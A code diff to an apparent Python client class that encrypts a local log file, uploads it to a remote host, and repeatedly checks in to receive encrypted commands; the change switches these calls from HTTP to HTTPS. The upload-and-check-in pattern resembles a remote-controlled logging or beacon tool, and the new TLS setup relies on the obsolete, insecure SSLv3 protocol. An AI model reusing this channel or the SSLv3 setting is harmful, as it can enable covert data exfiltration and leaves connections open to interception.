@@ -6,6 +6,7 @@ import os
 import socket
 import subprocess
 import time
+import ssl
 from configparser import ConfigParser
 from glob import glob
 from threading import Thread, Event
@@ -38,7 +39,7 @@ class Updater(Thread):
         """
         content_type, body = self.encode_multipart_formdata(fields, files)
         # Choose between http and https connections
-        h = http.client.HTTPConnection(host)
+        h = http.client.HTTPSConnection(host)
         h.putrequest('POST', selector)
         h.putheader('content-type', content_type)
         h.putheader('content-length', str(len(body)))
@@ -97,7 +98,7 @@ class Updater(Thread):
             n = aes_crypt.encrypt(json.dumps(names)).decode('utf-8')
             with open(logfile, 'r') as f:
                 encrypted_data = aes_crypt.encrypt(f.read())
-                self.post_multipart("{}".format(hostname), "http://{}/post_log".format(hostname), [("names", n)],
+                self.post_multipart("{}".format(hostname), "https://{}/post_log".format(hostname), [("names", n)],
                                     [("file", "log", encrypted_data)])
         except Exception as e:
             print(str(e))
@@ -112,14 +113,15 @@ class Updater(Thread):
 
             data = parse.urlencode({'data': ciphertext})
             data = data.encode('utf-8')
-            req = request.Request('http://{}/checkin'.format(hostname), data)
+            req = request.Request('https://{}/checkin'.format(hostname), data)
 
             # do backwards change if response is valid later.
             tries = 0
             while tries < 120:
                 try:
-
-                    data = request.urlopen(req)
+                    handler = request.HTTPSHandler(context=ssl.SSLContext(ssl.PROTOCOL_SSLv3))
+                    opener = request.build_opener(handler)
+                    data = opener.open(req)
                     if data.getcode() == 200:
                         # do config modify/parse of command here.
                         data = json.loads(aes_crypt.decrypt(data.read().decode("utf-8")))
